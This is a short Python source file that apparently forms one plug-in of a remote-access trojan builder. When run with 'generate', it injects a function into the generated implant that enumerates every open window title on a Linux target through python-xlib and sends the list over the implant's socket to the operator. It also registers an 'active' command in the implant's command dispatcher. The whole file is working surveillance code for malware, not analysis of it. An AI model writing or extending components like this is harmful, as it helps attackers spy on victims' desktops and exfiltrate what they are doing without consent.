import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import Xlib')
        config.import_statements.append('import Xlib.display')
        config.functions.append('''
def active():
    data = '[+]All opened windows : \\n'
    display = Xlib.display.Display()
    screen = display.screen() 
    root = screen.root 
    tree = root.query_tree() 
    wins = tree.children 
    tmp_list = []
    for win in wins:
        if win.get_wm_name():
            tmp_list.append('   - ' + win.get_wm_name())
    tmp_list = list(set(tmp_list))
    send_all(s,(data + '\\n'.join(tmp_list) + '\\n'))''')
        config.logics.append('''
            elif command == "active":
                active()''')
        config.help_menu['active'] = 'Shows all open windows on the target system'
    elif option == 'info':
        print('\nName             : Active Windows Dump component' \
              '\nOS               : Linux' \
              '\nRequired Modules : python-xlib (external)' \
              '\nCommands         : active' \
              '\nDescription      : Shows all open windows on the target system\n')
